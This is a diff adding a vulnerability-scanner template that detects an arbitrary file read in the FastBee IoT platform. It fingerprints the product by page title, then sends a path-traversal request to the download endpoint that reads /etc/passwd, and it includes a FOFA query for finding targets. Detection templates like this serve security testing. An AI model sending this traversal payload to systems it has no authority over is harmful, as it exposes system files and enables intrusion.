@@ -1,0 +1,53 @@
+flow: http(1) && http(2)
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - contains(body,"<title>FastBee")
+    - status_code == 200
+    internal: true
+    type: dsl
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - regex:
+    - 'root:[x*]:0:0:'
+    type: regex
+  - part: content_type
+    type: word
+    words:
+    - application/octet-stream
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: fastbee-arbitrary-file-read
+info:
+  author: s4e-io
+  description: 'Arbitrary file read vulnerability exists in FastBee IoT platform download,
+    which may lead to sensitive information leakage, data theft and other security
+    risks, thus causing serious harm to the system and users.
+
+    '
+  metadata:
+    fofa-query: fastbee
+    max-request: 1
+    product: fastbee
+    vendor: fastbee
+    verified: true
+  name: FastBee - Local File Inclusion
+  reference:
+  - https://blog.csdn.net/weixin_43167326/article/details/141806542
+  severity: high
+  tags: fastbee,iot,lfi,vuln
